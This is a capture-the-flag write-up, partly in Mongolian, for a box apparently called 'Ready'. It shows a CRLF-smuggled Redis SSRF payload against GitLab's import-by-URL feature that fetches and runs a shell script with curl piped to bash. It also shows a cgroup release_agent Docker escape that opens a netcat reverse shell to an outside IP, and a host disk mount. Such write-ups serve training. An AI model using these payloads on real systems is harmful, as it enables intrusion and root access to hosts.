# Ready - GitLab SSRF / Docker Escape --privileged

## Shell as Git

https://github.com/CS4239-U6/gitlab-ssrf

Import project > Repo by URL. We are going to use that to perform our SSRF attack.

[image]

### SSRF Payload (URL encoded, CRLF)

```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{...GitlabShellWorker...curl...shell.sh|bash...}"
 exec
 exec
/ssrf.git
```

## Docker escape

`/opt/backup/docker-compose.yml` файлыг унших үед `--privileged: true` байгаа юм. Энэ нь бидний container маань host дээр root эрхтэй байгаа гэсэн үг.

[image]

## cgroups Escape

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "busybox nc 10.10.16.27 4444 -e sh > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

[image]

## File System Escape

/dev/sda2 ийг /mnt-тэй mount хийх

```bash
mount /dev/sda2 /mnt
```

[image]
